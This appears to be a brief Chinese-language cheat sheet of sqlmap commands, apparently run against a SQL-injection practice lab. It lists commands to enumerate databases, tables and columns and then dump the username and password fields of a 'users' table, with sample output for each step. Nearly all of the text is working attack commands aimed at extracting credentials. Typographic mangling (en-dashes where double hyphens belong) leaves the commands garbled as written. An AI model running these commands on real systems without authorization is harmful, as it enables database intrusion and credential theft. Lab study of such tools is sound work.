#sqlmap 参数

1.查数据库 python sqlmap.py -u “URL” –dbs
[] security
[] test
[] xss
[] yzmcms

2.指定数据库查表： python sqlmap.py -u “URL” -D “security” –tables
-D ：指定数据库名
Database: security
[4 tables]

| emails |
| referers |
| uagents |
| users |

3.查字段：python sqlmap.py -u “URL” -D “security” -T “users” –columns
-T: 指定表名
Database: security
Table: users
[3 columns]
+———-+————-+
| Column | Type |

| id | int(3) |
| password | varchar(20) |

4.获取字段内容：python sqlmap.py -u “URL” -D “security” -T “users” -C “username,password” –dump
-C: 指定字段
